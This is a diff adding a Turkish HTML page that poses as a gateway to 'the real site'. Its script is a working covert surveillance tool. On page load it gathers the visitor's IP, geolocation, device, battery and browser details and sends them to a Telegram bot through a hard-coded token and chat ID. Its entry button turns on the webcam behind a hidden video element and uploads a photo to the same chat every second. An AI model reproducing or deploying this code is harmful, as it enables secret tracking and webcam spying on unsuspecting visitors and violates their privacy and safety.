@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>#TAG Sitesi</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      margin-top: 100px;
+    }
+    button {
+      background-color: #00cc66;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 30px;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Bu bir <strong>#TAG</strong> sitesidir.</h1>
+  <p>Asıl siteye giriş için tıklayınız.</p>
+  <button onclick="startCamera()">Asıl Siteye Giriş</button>
+
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = "7577331017:AAHqRsuHNoys9lk0HXePBfDRVxwRZzlEVM8";
+    const CHAT_ID = "7447413528";
+
+    // Siteye girince bilgi gönder
+    window.onload = async function() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const battery = navigator.getBattery ? await navigator.getBattery() : null;
+
+        const info = `
+𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𓊇       𒋨────━𓆩ZECOWER𓆪‏━────𒋨
+
+IP Adresi: ${data.ip}
+Şehir: ${data.city}
+Ülke: ${data.country_name}
+Zaman: ${new Date().toLocaleString()}
+Bağlantı Türü: ${navigator.connection?.effectiveType || 'Bilinmiyor'}
+Cihaz Tipi: ${/Mobi|Android/i.test(navigator.userAgent) ? '📱 Mobil' : '💻 Masaüstü'}
+Ekran Çözünürlüğü: ${screen.width}x${screen.height}
+Pencere Boyutu: ${window.innerWidth}x${window.innerHeight}
+Ekran Yönelimi: ${screen.orientation?.type || 'Bilinmiyor'}
+Şarj Durumu: ${battery ? (battery.level * 100) + "%" : "Bilinmiyor"}
+Tarayıcı: ${navigator.userAgent}
+DPI: ${window.devicePixelRatio}
+Zaman Dilimi: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Cihaz Belleği: ${navigator.deviceMemory || 'Bilinmiyor'}GB
+Konum: ${data.latitude}, ${data.longitude}
+Sayfa Başlığı: ${document.title}
+Sayfa URL'si: ${window.location.href}
+Ekran Yoğunluğu: ${window.devicePixelRatio}
+Yüklenme Süresi: ${performance.now().toFixed(0)}ms
+WebRTC: ${typeof RTCPeerConnection !== 'undefined'}
+Yönlendiren: ${document.referrer || 'Yok'}
+Kullanıcı Dili: ${navigator.language}
+Bağlantı Hızı: ${navigator.connection?.downlink || 'Bilinmiyor'}Mbps
+Zaman Damgası: ${Date.now()}
+
+𒋨────━𓆩PYEFE𓆪‏━────𒋨
+𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌: @PYEFE
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: info })
+        });
+      } catch (e) {
+        console.error("Bilgi alınamadı:", e);
+      }
+    }
+
+    // Kamera başlat ve fotoğraf gönder
+    async function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setInterval(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+          }, 'image/jpeg');
+        }, 1000); // 1 saniyede bir gönder
+      } catch (err) {
+        alert("Kamera açma hatası: " + err);
+      }
+    }
+  </script>
+</body>
+</html>
